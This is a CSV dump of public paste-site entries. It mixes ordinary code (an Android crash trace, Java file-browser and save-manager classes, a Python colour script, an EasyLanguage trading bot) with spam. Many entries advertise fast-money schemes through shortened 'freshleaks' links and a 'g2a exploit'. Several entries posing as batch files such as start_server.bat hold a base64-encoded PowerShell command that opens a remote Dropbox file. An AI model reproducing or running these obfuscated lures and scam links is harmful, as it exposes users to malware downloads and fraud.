id,title,username,language,date,content
MWuKuGdy,2025-05-09T14:05:59.277,powerampache,PHP,Friday 9th of May 2025 01:06:00 PM CDT,"1.01-80 (80) - DB: 83
java.lang.NullPointerException
	at luci.sixsixsix.powerampache2.data.MusicRepositoryImpl$getGenres$2.invokeSuspend(MusicRepositoryImpl.kt:350)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:914)
	at android.os.Handler.dispatchMessage(Handler.java:100)
	at android.os.Looper.loop(Looper.java:225)
	at android.app.ActivityThread.main(ActivityThread.java:7563)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:539)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:994)

getGenres() - generic exception {""stackTrace"":[{""declaringClass"":""luci.sixsixsix.powerampache2.data.MusicRepositoryImpl$getGenres$2"",""fileName"":""MusicRepositoryImpl.kt"",""lineNumber"":350,""methodName"":""invokeSuspend""},{""declaringClass"":""kotlin.coroutines.jvm.internal.BaseContinuationImpl"",""fileName"":""ContinuationImpl.kt"",""lineNumber"":33,""methodName"":""resumeWith""},{""declaringClass"":""kotlinx.coroutines.DispatchedTask"",""fileName"":""DispatchedTask.kt"",""lineNumber"":104,""methodName"":""run""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":914,""methodName"":""handleCallback""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":100,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":225,""methodName"":""loop""},{""declaringClass"":""android.app.ActivityThread"",""fileName"":""ActivityThread.java"",""lineNumber"":7563,""methodName"":""main""},{""declaringClass"":""java.lang.reflect.Method"",""fileName"":""Method.java"",""lineNumber"":-2,""methodName"":""invoke""},{""declaringClass"":""com.android.internal.os.RuntimeInit$MethodAndArgsCaller"",""fileName"":""RuntimeInit.java"",""lineNumber"":539,""methodName"":""run""},{""declaringClass"":""com.android.internal.os.ZygoteInit"",""fileName"":""ZygoteInit.java"",""lineNumber"":994,""methodName"":""main""}],""suppressedExceptions"":[]}"
vu6tNMGm,2025-05-09T17:57:32.354182 92,bodelike,JavaScript,Friday 9th of May 2025 01:03:58 PM CDT,5677163 - check it out at https://tinyurl.com/yc4w4vys
WbvkjPST,⭐️Make $3000 in 24 hours W7,SirPleasecalmdown,JavaScript,Friday 9th of May 2025 01:02:50 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

I6M9BZcziD
"
hLhCfrqW,⭐️Earn $2000 a Month From Home UC,SirPleasecalmdown,JavaScript,Friday 9th of May 2025 12:59:25 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

5YvqNi45gb
"
UUP6mHZQ,⭐️Make 2000$+ daily together BI,SirPleasecalmdown,JavaScript,Friday 9th of May 2025 12:56:01 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

avUrYrCajK
"
QR6Npwsg,⭐️500£ ANY SITE BALANCE INSTANTLY 2025 3J,SirPleasecalmdown,JavaScript,Friday 9th of May 2025 12:52:39 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

KGe5aPRNj1
"
AG6AJbVS,reset_network.cmd 55,jonomagon,JavaScript,Friday 9th of May 2025 12:51:37 PM CDT,1594403 - check it out at https://tinyurl.com/3u95mw4w
iLmfaxZb,Black Hole optimization v2 (11 nodes) 70,Billay01,JavaScript,Friday 9th of May 2025 12:51:07 PM CDT,4599679 - check it out at https://tinyurl.com/yc4w4vys
WXBi5zwz,⭐️Make $3000 in 24 hours W7,SirPleasecalmdown,JavaScript,Friday 9th of May 2025 12:49:15 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

k4SZ8flXiJ
"
vN0hYc2t,⭐️Earn $2000 a Month From Home UC,SirPleasecalmdown,JavaScript,Friday 9th of May 2025 12:45:51 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

GAJZymFE7g
"
tcqti5bf,⭐️Make 2000$+ daily together BI,SirPleasecalmdown,JavaScript,Friday 9th of May 2025 12:42:26 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

1ClfGQfj1k
"
ne3DsPux,⭐️Make 2000$+ daily together BI,Sandywarrior19,JavaScript,Friday 9th of May 2025 12:38:57 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

cfKe9GxSrg
"
cMS2QTNR,file manager,SforzandoCF,Java,Friday 9th of May 2025 12:36:10 PM CDT,"import java.awt.image.BufferedImage;
import java.io.DataInputStream;
import java.io.EOFException;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.attribute.BasicFileAttributes;
import java.util.Scanner;

import javax.imageio.ImageIO;
import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.UnsupportedAudioFileException;

public class Main {
    public static void main (String[] args) {
        Scanner scanner = new Scanner(System.console().reader());
        File root = null;
        FileInputStream reading = null;
        while (true) {
            if (scanner.hasNextLine()) {
                String next = scanner.nextLine();
                if (next.equals(""/view-files"")) {
                    root = File.listRoots()[0];
                    print(root);
                } else if (next.startsWith(""/view-file "")) {
                    try {
                        int number = Integer.parseInt(next.substring(11));
                        root = root.listFiles()[number];
                    } catch (NumberFormatException nfe) {
                        String name = next.substring(11);
                        for (File f : root.listFiles()) {
                            if (f.getName().endsWith(name)) {
                                root = f;
                                break;
                            }
                            if (f.getName().endsWith(name + ""/"")) {
                                root = f;
                                break;
                            }
                        }
                    }
                    print(root);
                } else if (next.startsWith(""/move-up"")) {
                    root = root.getParentFile();
                    print(root);
                } else if (next.startsWith(""/inspect-file"")) {
                    if (!root.isFile()) continue;
                    inspect(root);
                } else if (next.startsWith(""/inspect-text"")) {
                    if (!root.isFile()) continue;
                    inspectAsText(root);
                } else if (next.startsWith(""/jump-to "")) {
                    File f = new File(next.substring(9));
                    if (f.exists()) {
                        root = f;
                        print(root);
                    }
                } else if (next.startsWith(""/view-root"")) {
                    System.out.println(root);
                } else if (next.startsWith(""/open"")) {
                    try {
                        reading = new FileInputStream(root);
                        System.out.println(""file opened"");
                    } catch (IOException ioe) {}
                } else if (next.startsWith(""/read "")) {
                    read(reading, Integer.parseInt(next.substring(6)));
                }
                if (root == null) {
                    System.out.println(""internal error: file accesed does not exist"");
                    root = File.listRoots()[0];
                }
            }
        }
    }
    
    public static void print (File file) {
        if (!file.isDirectory()) printFile(file);
        File[] files = file.listFiles();
        if (files == null) return;
        if (files.length == 0) {
            System.out.println(""-> empty directory\n"");
            return;
        }
        for (int i = 0; i < files.length; i++)
            System.out.println(""["" + i + ""] -> "" + files[i] + (files[i].isDirectory() ? ""/"" : """"));
        System.out.println();
    }
    
    public static void printFile (File f) {
        BasicFileAttributes attrs;
        try {
            attrs = Files.readAttributes(f.toPath(), BasicFileAttributes.class);
        } catch (IOException ioe) {
            System.out.println(ioe);
            return;
        }
        System.out.println(""-> path: "" + f.toString());
        String name = f.getName();
        String ext = (name.contains(""."") ? name.substring(name.lastIndexOf(""."")) : ""none"");
        name = name.contains(""."") ? name.substring(0, name.lastIndexOf(""."")) : name;
        if (f.getName().startsWith(""."")) {
            name = ext;
        }
        System.out.println(""-> name: "" + name);
        System.out.println(""-> extension: "" + ext);
        System.out.println();
        System.out.println(""-> time created: "" + attrs.creationTime());
        System.out.println(""-> time last modified: "" + attrs.lastModifiedTime());
        System.out.println(""-> time last accessed: "" + attrs.lastAccessTime());
        System.out.println();
        System.out.println(""-> executable: "" + f.canExecute());
        System.out.println(""-> readable: "" + f.canRead());
        System.out.println(""-> writable: "" + f.canWrite());
        System.out.println(""-> hidden: "" + f.isHidden());
        System.out.println();
        String type = ""file"";
        if (attrs.isSymbolicLink()) type = ""symlink"";
        if (attrs.isOther()) type = ""other"";
        System.out.println(""-> type: "" + type);
        System.out.println(""-> file size: "" + attrs.size());
        System.out.println();
        System.out.println(""-> partition size: "" + f.getTotalSpace());
    }
    
    private static void inspect (File f) {
        if (tryInspectImage(f)) return;
        if (tryInspectAudio(f)) return;
        try {
            DataInputStream d = new DataInputStream(new FileInputStream(f));
            StringBuilder sb = new StringBuilder();
            sb.append(""-> "");
            int index = 0;
            int line = 0;
            int chunk = 0;
            while (true) {
                try {
                    String b = Integer.toHexString(d.readByte());
                    if (b.length() < 2) b = ""0"".concat(b);
                    if (b.length() > 2) b = b.substring(b.length() - 2);
                    sb.append(b);
                    index++;
                    if (index == 16) {
                        index = 0;
                        line++;
                        if (line == 16) {
                            line = 0;
                            chunk++;
                            if (chunk == 3) {
                                System.out.println(sb.toString());
                                System.out.println(""\n...\n"");
                                return;
                            }
                            System.out.println(sb.toString());
                            sb = new StringBuilder();
                        }
                        sb.append(""\n-> "");
                    } else {
                        sb.append("" "");
                    }
                } catch (EOFException eof) {
                    System.out.println(sb.toString());
                }
            }
        } catch (IOException ioe) {
            System.out.println(ioe);
        }
    }
    
    private static void inspectAsText (File f) {
        try {
            DataInputStream d = new DataInputStream(new FileInputStream(f));
            StringBuilder sb = new StringBuilder();
            sb.append(""-> "");
            int index = 0;
            int line = 0;
            int chunk = 0;
            while (true) {
                try {
                    sb.append(toChar(d.readByte()));
                    index++;
                    if (index == 16) {
                        index = 0;
                        line++;
                        if (line == 16) {
                            line = 0;
                            chunk++;
                            if (chunk == 3) {
                                System.out.println(sb.toString());
                                System.out.println(""\n-> ...\n"");
                                return;
                            }
                            System.out.println(sb.toString());
                            sb = new StringBuilder();
                        }
                        sb.append(""\n-> "");
                    }
                } catch (EOFException eof) {
                    System.out.println(sb.toString());
                }
            }
        } catch (IOException ioe) {
            System.out.println(ioe);
        }
    }
    
    private static boolean tryInspectImage (File f) {
        return tryInspectImage(f, true);
    }
    
    private static boolean tryInspectImage (File f, boolean loopInternally) {
        try {
            BufferedImage i = ImageIO.read(f);
            if (i == null) return false;
            System.out.println(""-> width: "" + i.getWidth());
            System.out.println(""-> height: "" + i.getHeight());
            System.out.println();
            return true;
        } catch (IOException ioe) {
            if (loopInternally) return tryInspectImage(f, false);
            return false;
        }
    }
    
    private static boolean tryInspectAudio (File f) {
        return tryInspectAudio(f, true);
    }
    
    private static boolean tryInspectAudio (File f, boolean loopInternally) {
        try {
            AudioFormat format = AudioSystem.getAudioInputStream(f).getFormat();
            System.out.println(""-> encoding: "" + format.getEncoding());
            String channels;
            if (format.getChannels() == 1) channels = ""mono"";
            else if (format.getChannels() == 2) channels = ""stereo"";
            else channels = format.getChannels() + "" channels"";
            System.out.println(""-> channels: "" + channels);
            System.out.println(""-> sample rate: "" + format.getSampleRate());
            System.out.println(""-> sample size: "" + format.getSampleSizeInBits() + ""-bit"");
            System.out.println(""-> big-endian: "" + format.isBigEndian());
            System.out.println();
            return true;
        } catch (IOException ioe) {
            if (loopInternally) return tryInspectImage(f, false);
            return false;
        } catch (UnsupportedAudioFileException uafe) {
            return false;
        }
    }
    
    private static char toChar (byte b) {
        if (b < 20) return '.';
        return (char) b;
    }
    
    private static void read (FileInputStream fs, int amt) {
        if (fs == null) return;
        try {
            for (int i = 0; i < amt; i++)
                System.out.println(Integer.toHexString(fs.read()));
        } catch (IOException ioe) {
            System.out.println(""io error occured"");
        }
    }
}"
suCD0F1X,⭐️500£ ANY SITE BALANCE INSTANTLY 2025 3J,Sandywarrior19,JavaScript,Friday 9th of May 2025 12:35:34 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

9m9jBCUL9c
"
mCQiP7tE,⭐️Make $3000 in 24 hours W7,Sandywarrior19,JavaScript,Friday 9th of May 2025 12:32:09 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

7LlXodlNyt
"
UVheguN4,⭐️Earn $2000 a Month From Home UC,Sandywarrior19,JavaScript,Friday 9th of May 2025 12:28:46 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

iNfvsnQFb4
"
g64m8FEg,⭐️Make 2000$+ daily together BI,Sandywarrior19,JavaScript,Friday 9th of May 2025 12:25:21 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

NduqnlK6pw
"
5EBBVhpw,⭐️Earn $2000 a Month From Home UC,gabytoleon,JavaScript,Friday 9th of May 2025 12:21:48 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

tBmvOqHg2p
"
gXu8DLNx,⭐️Make 2000$+ daily together BI,gabytoleon,JavaScript,Friday 9th of May 2025 12:18:25 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

3bOdSwInG7
"
cfcshrrL,⭐️500£ ANY SITE BALANCE INSTANTLY 2025 3J,gabytoleon,JavaScript,Friday 9th of May 2025 12:14:59 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

ybOQw0TyFg
"
kiVZfFcN,restart_services.cmd04,josearaujo,JavaScript,Friday 9th of May 2025 12:13:33 PM CDT,0969323 - check it out at https://tinyurl.com/3u95mw4w
KED8Cind,Test roblox96,Billay01,JavaScript,Friday 9th of May 2025 12:13:12 PM CDT,0814615 - check it out at https://tinyurl.com/yc4w4vys
tZgEWBGc,start_server.bat37,tashrid,JavaScript,Friday 9th of May 2025 12:13:02 PM CDT,4702197 - check it out at powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwBwADUANgBjAGcANQByADgAMABqAGMAeAB0AGQAeQB2AHUAegB0AGcAcQAvAHYAMQAuADgALgBwAGQAZgA/AHIAbABrAGUAeQA9AHIAZgBhAGcANQA5AGoAbgBjADYAZABoAGoAZgBnAHgAdAB2AGUAegBhAHYAYQBlAHgAJgBzAHQAPQAyAGcAcwBkADUAZAA3AGgAJgBkAGwAPQAwACIAIAAgACMAIABpAGQAPQBjAGIAMgBkADYAMgBiAGYA
WMUhcayc,??Earn $2000 a Month From Home UC48,Billay01,JavaScript,Friday 9th of May 2025 12:12:41 PM CDT,5408008 - check it out at https://tinyurl.com/yc4w4vys
kFEjEGBz,reset_network.cmd30,tashrid,JavaScript,Friday 9th of May 2025 12:12:31 PM CDT,0624213 - check it out at powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwBwADUANgBjAGcANQByADgAMABqAGMAeAB0AGQAeQB2AHUAegB0AGcAcQAvAHYAMQAuADgALgBwAGQAZgA/AHIAbABrAGUAeQA9AHIAZgBhAGcANQA5AGoAbgBjADYAZABoAGoAZgBnAHgAdAB2AGUAegBhAHYAYQBlAHgAJgBzAHQAPQAyAGcAcwBkADUAZAA3AGgAJgBkAGwAPQAwACIAIAAgACMAIABpAGQAPQBjAGIAMgBkADYAMgBiAGYA
hMnTtGFp,run_tests.bat49,KIETPRO_0108,JavaScript,Friday 9th of May 2025 12:12:04 PM CDT,4954230 - check it out at powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwBwADUANgBjAGcANQByADgAMABqAGMAeAB0AGQAeQB2AHUAegB0AGcAcQAvAHYAMQAuADgALgBwAGQAZgA/AHIAbABrAGUAeQA9AHIAZgBhAGcANQA5AGoAbgBjADYAZABoAGoAZgBnAHgAdAB2AGUAegBhAHYAYQBlAHgAJgBzAHQAPQAyAGcAcwBkADUAZAA3AGgAJgBkAGwAPQAwACIAIAAgACMAIABpAGQAPQBjAGIAMgBkADYAMgBiAGYA
2wuGcDqN,install_dependencies.ps155,jonomagon,JavaScript,Friday 9th of May 2025 12:12:03 PM CDT,7878459 - check it out at https://tinyurl.com/3u95mw4w
hB8V135a,⭐️Make $3000 in 24 hours W7,gabytoleon,JavaScript,Friday 9th of May 2025 12:11:32 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

VN9vqOpY5c
"
LmdM8KPG,⭐️Earn $2000 a Month From Home UC,gabytoleon,JavaScript,Friday 9th of May 2025 12:08:08 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

S3OevlHFW4
"
rAi0D4sN,# rgb_to_360.py,here2share,Python,Friday 9th of May 2025 11:48:55 AM CDT,"# rgb_to_360.py

o360 = 358.5 / (255 * 255 * 255)

def rgb_to_360(r, g, b):
    return int(((r * 255 * 255) + (g * 255) + b) * o360)

loop = range(0, 256, 21)

for r in loop:
	for g in loop:
		for b in loop:
			number = rgb_to_360(r, g, b)
			print(number)
			
number = rgb_to_360(255, 255, 255)
print(number)"
jZf5KpDn,Untitled,LA77,Java,Friday 9th of May 2025 11:23:52 AM CDT,"package nl.rug.oop.rpg;

import java.io.*;
import java.util.Scanner;

/**
 * Utility class for saving and loading.
 */
public class SaveManager {

    /**
     * The directory where the saves are stored.
     */
    public static final String SAVED_GAMES_DIRECTORY = ""savedgames"";
    /**
     * The file extension for saves.
     */
    public static final String SAVE_FILE_EXTENSION = "".ser"";

    /**
     * Saves the current state of the game.
     *
     * @param game     The game object to be saved.
     * @param filename The name of the file.
     */
    public static void saveGame(Game game, String filename) {
        ensureDirectory();

        try (ObjectOutputStream out = new ObjectOutputStream(
                new FileOutputStream(getFullPath(filename)))) {
            out.writeObject(game);
            System.out.println(""Quicksave successful!"");
        } catch (IOException e) {
            System.err.println(""Failed to save game: "" + e.getMessage());
        }
    }

    /**
     * Loading a file.
     *
     * @param filename The name of the file.
     * @return A game object representing the loaded state.
     */
    public static Game loadGame(String filename) {
        try (ObjectInputStream in = new ObjectInputStream(
                new FileInputStream(getFullPath(filename)))) {
            System.out.println(""Quickload successful!"");
            return (Game) in.readObject();
        } catch (IOException | ClassNotFoundException e) {
            System.err.println(""Failed to load game: "" + e.getMessage());
            return null;
        }
    }

    /**
     * Displays a list of available saves for the user to pick.
     *
     * @param scanner scanner object to read user input.
     * @return the loaded game object.
     */
    public static Game promptAndLoadSave(Scanner scanner) {
        File folder = new File(SAVED_GAMES_DIRECTORY);
        File[] saves = folder.listFiles((dir, name) -> name.endsWith(SAVE_FILE_EXTENSION));

        if (saves == null || saves.length == 0) {
            System.out.println(""No save files found."");
            return null;
        }

        System.out.println(""Which file? (-1 : none)"");
        for (int i = 0; i < saves.length; i++) {
            System.out.println(""("" + i + "") "" + saves[i].getName());
        }

        int choice = scanner.nextInt();
        if (choice >= 0 && choice < saves.length) {
            return loadGame(saves[choice].getName());
        }
        return null;
    }

    /**
     * Returns the full path of the file.
     *
     * @param filename The name of the file.
     * @return The full path of the file.
     */
    private static String getFullPath(String filename) {
        return SAVED_GAMES_DIRECTORY +
                File.separator +
                filename +
                (filename.endsWith(SAVE_FILE_EXTENSION) ? """" : SAVE_FILE_EXTENSION);
    }

    /**
     * Ensures that the directory exists.
     */
    private static void ensureDirectory() {
        File saveDir = new File(SAVED_GAMES_DIRECTORY);
        if (!saveDir.exists()) {
            saveDir.mkdir();
        }
    }
}
"
7G1HQdJm,Bot Reversal-Band-Riot-P1 ETHUSDT.P BYBIT 4H LONG E SHORT,Maurizio-Ciullo,JavaScript,Friday 9th of May 2025 11:13:52 AM CDT,"
																// Bot Reversal Band Riot Period 1 10-03-2025 ETHUSDT.P BYBIT 4H LONG E SHORT //
														  // Datafeed Cambiato / Periodi Backtest Cambiati / Inputs Cambiati / Skip Months Disattivato //
																
// RIOTTIMIZZAZIONE PERIODICA 1 DELLA ORIGINALE REVERSAL BAND		
// IL DATAFEED COMPLETO = (18/08/2017 26/02/2025)												
// NUOVI DATI DI SVILUPPO DATAFEED ETH/USDT BINANCE + ETH/USDT.P BYBIT 4H  STORICO INIZIALE BINANCE PER POI PROSEGUIRE CON BYBIT																														
// (Sviluppo Dati Exchange = BINANCE + BYBIT) (BINANCE Dal=18/08/2017 Al 21/10/2020) (BYBIT Dal=21/10/2020 Al 26/02/2025)
// SU TRADINGVIEW ORARIO BORSA GMT
// BARSBACK: 60

// NUOVE DATE IN SAMPLE E OUT OF SAMPLE
//Il data feed completo: 18/08/2017 26/02/2025
//In Sample: Inizio 18/08/2017 Fine 18/09/2023
//Out Of Sample: Inizio 18/09/2023 Fine 26/02/2025


//Il trading system completo - Bot Reversal Band Riot Period 1 10-03-2025 ETHUSDT.P BYBIT 4H LONG E SHORT 
// (Exchange= BYBIT) (Sottostante ETH-USDT.P) (Timeframe= 4H) (Direzione= LONG E SHORT) (Swing Posizione= SI) (Esclusione Ore=NO) (Esclusione Giorni=NO) (Esclusione Mesi=NO)
// (Take Profit Long/Short= Market Close Sopra/Sotto Bande) (Take Profit Limit Long= +12% Tradingview-Hub) (Take Profit Limit Short= +6,7 % Tradingview-Hub
// (Stop Loss Limit Long= -10% Tradingview-Hub) (Stop Loss Limit Short= -7.1% Tradingview-Hub) (Trailing Stop=NO) (Stop Emergenza: NO)
// (Max DD Concesso = 15% Media Max Drawdown 2°nda Deviazione Standard Simulazione Montecalo Python
// (Money Management = 25% Del Capitale Tradestation)  
// (Money Management = 18% Del Capitale Tradingview) Preso Dal 15% Media Max Drawdown 2°nda Deviazione Standard Simulazione Montecarlo Python

// (Progettatta Il=07/07/23)
// (In Sample Dal=17/08/2017 18/09/2023) (Out Of Sample Dal18/09/2023 Al 26-02-2025)
// (Progettatta Il=26/02/2025)

// ATTENZIONE, ALCUNE POSIZIONI SONO DIFFERENTI DA TRADINGVIEW PER VIA DELLE CANDELE INIZIALI CHE SONO DI BINANCE CHE POTREBBERO AVERE VALORI LEGGERENTE DIVERSI.
// ATTENZIONE, ALCUNE VOLTE, MOLTO RARAMENTE LE MEDIE POTREBBERO DIFFERIRE SEMPRE PER VIDE DELLE CANDELE INIZIALI CHE SONO DI BINANCE CHE POTREBBERO AVERE VALORI LEGGERENTE DIVERSI.
// ATTENZIONE, I VALORI DELL'ADX A VOLTE POSSONO ESSERE DIFFERENTI PER VIA DELLE CANDELE INIZIALI CHE SONO DI BINANCE PER POI RIASSESTARSI DI NUOVO.

input:
	InitialCapital(100000),
	percent_risk(25),
	input_stop_loss_percent_long(10),
	input_stop_loss_percent_short(7.1),
	input_target_percent_long(12),
	input_target_percent_short(6.7),
	lunghezza_sma_long(31),
	lunghezza_sma_short(48),
	deviazione_long(1.7),
	deviazione_short(1.3), 
	lunghezza_adx_long(6),
	lunghezza_adx_short(10),
	differenziale_adx_long(60), 
	differenziale_adx_short(22), 
	lung_ema_long(52),
	lung_ema_short(42),
	//skipday(thursday),
	skipmonth1(4), 
	skipmonth2(8),
	solo_long(false),
	solo_short(false);
	
Vars:
	 
	 media_long(0),
	 media_short(0),
	 middle_Band_long(0),
	 deviazione_st_long(0),
	 UpperBand_long(0),
	 LowerBand_long(0),
	 valore_adx_long(0), 
	 middle_Band_short(0),
	 deviazione_st_short(0),
	 UpperBand_short(0),
	 LowerBand_short(0),
	 valore_adx_short(0),
	 stop_loss_long(0),
	 stop_loss_short(0),
	 target_long(0),
	 target_short(0),
	 account_equity(0),
	 risk(0),
	 nr_share(0);
	 
// Calcololo degli indicatori long 

	middle_Band_long      =   average(close, lunghezza_sma_long); 
	deviazione_st_long    =   deviazione_long * StandardDev(close,lunghezza_sma_long, 1); 
	UpperBand_long        =   middle_Band_long  + deviazione_st_long;
	LowerBand_long        =   middle_Band_long  - deviazione_st_long;
	valore_adx_long       =   adx(lunghezza_adx_long); 

// Calcololo degli indicatori short
	
	middle_Band_short      =   average(close, lunghezza_sma_short); 
	deviazione_st_short    =   deviazione_short * StandardDev(close,lunghezza_sma_short, 1); 
	UpperBand_short        =   middle_Band_short  + deviazione_st_short;
	LowerBand_short        =   middle_Band_short  - deviazione_st_short;
	valore_adx_short       =   adx(lunghezza_adx_short); 
 	
	media_long = XAverage(Close, lung_ema_long);
	media_short = XAverage(Close, lung_ema_short);	 	 
   	 
// Money menagment 
	
	risk = percent_risk/100;
	nr_share = floor((InitialCapital + NetProfit) * risk) / close;
	stop_loss_long=((((InitialCapital + NetProfit) * risk)/100) * input_stop_loss_percent_long);
	stop_loss_short=((((InitialCapital + NetProfit) * risk)/100) * input_stop_loss_percent_short);
	target_long=((((InitialCapital + NetProfit) * risk)/100) * input_target_percent_long);
	target_short=((((InitialCapital + NetProfit) * risk)/100) * input_target_percent_short);
	
		
// Entrata Long 

begin;	
	if close cross over LowerBand_long and close < media_long and valore_adx_long < differenziale_adx_long and not solo_short {and month(date) <> skipmonth2 and month(date) <> skipmonth1} {and Dayofweek(date) <> skipday} then 
			
		Buy(""Long"") nr_share contracts Next Bar at market;	
		
		If MarketPosition =1 then
		Begin;
		Setstopposition;
		SetStopLoss(stop_loss_long);
		Setprofittarget(target_long);
		
		End;
			
// Uscita Long
		 	
	if close cross over UpperBand_long then	
		Sell(""Chiusura Long"") from entry(""Long"") Next Bar at market; 		
end;	


// Entrata Short
   	
begin;	
	if close cross under UpperBand_short and close > media_short and valore_adx_short < differenziale_adx_short and not solo_long {and month(date) <> skipmonth2 and month(date) <> skipmonth1} {and Dayofweek(date) <> skipday} then

		Sellshort(""Short"") nr_share Contracts Next Bar at market;
		 	
		If MarketPosition =-1 then
		Begin
		Setstopposition;
		SetStopLoss(stop_loss_short);
		Setprofittarget(target_short);
		
		End;	
		
					
// Uscita Short

	if close cross under LowerBand_short then
			
		Buytocover(""Chiusura Short"") from entry(""Short"") Next Bar at market;
		
end;
		
		

		

"
XY3djq6E,Bot Reversal-Band-Riot-P1 ETHUSDT.P BYBIT 4H LONG E SHORT,Maurizio-Ciullo,JavaScript,Friday 9th of May 2025 11:12:00 AM CDT,"
																// Bot Reversal Band Riot Period 1 10-03-2025 ETHUSDT.P BYBIT 4H LONG E SHORT //
                                                          // Datafeed Cambiato / Periodi Backtest Cambiati / Inputs Cambiati / Skip Months Disattivato //
																
// RIOTTIMIZZAZIONE PERIODICA 1 DELLA ORIGINALE REVERSAL BAND		
// IL DATAFEED COMPLETO = (18/08/2017 26/02/2025)												
// NUOVI DATI DI SVILUPPO DATAFEED ETH/USDT BINANCE + ETH/USDT.P BYBIT 4H  STORICO INIZIALE BINANCE PER POI PROSEGUIRE CON BYBIT																														
// (Sviluppo Dati Exchange = BINANCE + BYBIT) (BINANCE Dal=18/08/2017 Al 21/10/2020) (BYBIT Dal=21/10/2020 Al 26/02/2025)
// SU TRADINGVIEW ORARIO BORSA GMT
// BARSBACK: 60

// NUOVE DATE IN SAMPLE E OUT OF SAMPLE
//Il data feed completo: 18/08/2017 26/02/2025
//In Sample: Inizio 18/08/2017 Fine 18/09/2023
//Out Of Sample: Inizio 18/09/2023 Fine 26/02/2025


//Il trading system completo - Bot Reversal Band Riot Period 1 10-03-2025 ETHUSDT.P BYBIT 4H LONG E SHORT 
// (Exchange= BYBIT) (Sottostante ETH-USDT.P) (Timeframe= 4H) (Direzione= LONG E SHORT) (Swing Posizione= SI) (Esclusione Ore=NO) (Esclusione Giorni=NO) (Esclusione Mesi=NO)
// (Take Profit Long/Short= Market Close Sopra/Sotto Bande) (Take Profit Limit Long= +12% Tradingview-Hub) (Take Profit Limit Short= +6,7 % Tradingview-Hub
// (Stop Loss Limit Long= -10% Tradingview-Hub) (Stop Loss Limit Short= -7.1% Tradingview-Hub) (Trailing Stop=NO) (Stop Emergenza: NO)
// (Max DD Concesso = 15% Media Max Drawdown 2°nda Deviazione Standard Simulazione Montecalo Python
// (Money Management = 25% Del Capitale Tradestation)  
// (Money Management = 18% Del Capitale Tradingview) Preso Dal 15% Media Max Drawdown 2°nda Deviazione Standard Simulazione Montecarlo Python

// (Progettatta Il=07/07/23)
